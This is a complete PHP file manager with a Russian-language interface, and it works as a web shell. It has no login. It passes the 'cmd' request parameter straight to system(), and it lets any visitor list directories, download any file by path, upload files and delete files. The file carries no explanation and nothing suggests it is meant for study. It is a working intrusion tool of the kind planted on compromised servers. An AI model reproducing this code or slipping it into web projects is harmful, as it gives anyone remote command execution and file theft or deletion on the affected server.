<?php 

function good_link($link) 
{ 
   $link = preg_replace("/\/+/","/",$link); 
   $link = preg_replace("/\/[^\/(..)]+\/\.\./","/",$link); 
   $link = preg_replace("/\/+/","/",$link); 
   if(!strncmp($link,"./",2) && strlen($link)>2) $link = substr($link,2); 
   if($link == "") $link="."; 
   return $link; 
} 

$dir = isset($_REQUEST['dir'])?$_REQUEST['dir']:"."; 
$dir = good_link($dir); 
$rep = opendir($dir); 
chdir($dir); 

if(isset($_REQUEST["down"]) && $_REQUEST["down"]!="") 
{ 
   header("Content-Type: application/octet-stream"); 
   header("Content-Length: ".filesize($_REQUEST["down"])); 
   header("Content-Disposition: attachment; filename = ".basename($_REQUEST["down"])); 
   readfile($_REQUEST["down"]); 
   exit(); 
}
 
?> 
<html> 
<head><title></title></head> 
<body> 
<br> 
<?php 

  echo "Текущая директория: <b>".getcwd()."</b><br>\n"; 
  echo "<b>dir = '$dir'</b><br>\n"; 
  
  if(isset($_REQUEST['cmd']) && $_REQUEST['cmd']!="") 
  { 
      echo "<pre>\n"; 
      system($_REQUEST['cmd']); 
      echo "</pre>\n"; 
  } 

  if(isset($_FILES["fic"]["name"])) 
  { 

     if(move_uploaded_file($_FILES["fic"]["tmp_name"],good_link("./".$_FILES["fic"]["name"]))) 
     { 
         echo "Файл ".good_link("./".$_FILES["fic"]["name"])." успешно загружен!<br>\n"; 
     } 
     else echo "Ошибка при загрузки: ".$_FILES["fic"]["error"]."<br>\n"; 
  } 

  if(isset($_REQUEST['rm']) && $_REQUEST['rm']!="") 
  { 
      if(unlink($_REQUEST['rm'])) echo "Файл ".$_REQUEST['rm']." удален!<br>\n"; 
      else echo "Невозможно удалить этот файл!<br>\n"; 
  } 

?> 
<hr> 
<table align="center" width="95%" border="0" cellspacing="0" bgcolor="lightblue"> 
<?php 

  $t_dir = array(); 
  $t_file = array(); 
  $i_dir = 0; 
  $i_file = 0; 

  while(($x = readdir($rep))!==false) 
  { 
      if(is_dir($x)) $t_dir[$i_dir++] = $x; 
      else $t_file[$i_file++] = $x; 
  } 

  closedir($rep);
 
  while(1) 
  { 

?> 
<tr> 
  <td width="20%" bgcolor="lightgray" valign="top"> 
<?php 

     if($x = each($t_dir)) 
     { 
         $name = $x["value"]; 
         if($name == '.'){} 
         elseif($name == '..') echo "Список директорий<br> <a href='".$_SERVER['PHP_SELF']."?dir=".good_link("$dir/../")."'>Вверх</a><br><br>\n"; 
         else echo " <a href=' ".$_SERVER['PHP_SELF']."?dir=".good_link("$dir/$name")."'>".$name."</a>\n"; 
     } 

?> 
  </td> 
  <td width='78%'

<?php 

    if($y = each($t_file)) 
    { 
        if($y["key"]%2==0) echo " bgcolor='lightgreen'>\n"; 
        else echo ">\n"; 
        echo "<a href='".$_SERVER['PHP_SELF']."?dir=$dir&down=".$y["value"]."'>".$y["value"]."</a>\n"; 
    } 

    else echo ">\n"; 
?> 
  </td> 
  <td valign='center' width='15%'<?php 

    if($y) 
    { 
        $size_file = @round(filesize($y["value"]));
        if($size_file <= 1024) $size_file = "$size_file б";
        if($size_file > 1024 and $size_file < 1048576) $size_file = "".round(($size_file/1024),2)." Kб";
        if($size_file > 1048576) $size_file = "".round(($size_file/1024/1024),2)." Mб";

        if($y["key"]%2==0) echo " bgcolor='lightgreen'"; 
        echo "><nobr>".substr(sprintf('%o', @fileperms($y["value"])), -4)."  $size_file <a href='".$_SERVER['PHP_SELF']."?dir=$dir&rm=".$y["value"]."'><b> Del </b></a></nobr>"; 
    } 
    else echo ">\n"; 

?></td> 
</tr> 
<?php 

    if(!$x && !$y)break; 

  } 
?> 
</table> 
<hr> 
<br> 
<a href="<?php echo $_SERVER['PHP_SELF']; ?>?dir=">перейти в корневой каталог</a><br><br> 
<form method="post" action="<?php echo $_SERVER['PHP_SELF']."?dir=$dir"; ?>"> 
Команда <input type="text" name="cmd"> <input type="submit" value="Задать!"> 
</form><br> 
Загрузить :<br> 
<form enctype="multipart/form-data" method="post" action="<?php echo $_SERVER['PHP_SELF']."?dir=$dir"; ?>"> 
<input type="file" name="fic"> 
<input type="submit" value="Загрузить!"></form><br> 
<br> 
</body> 
</html> 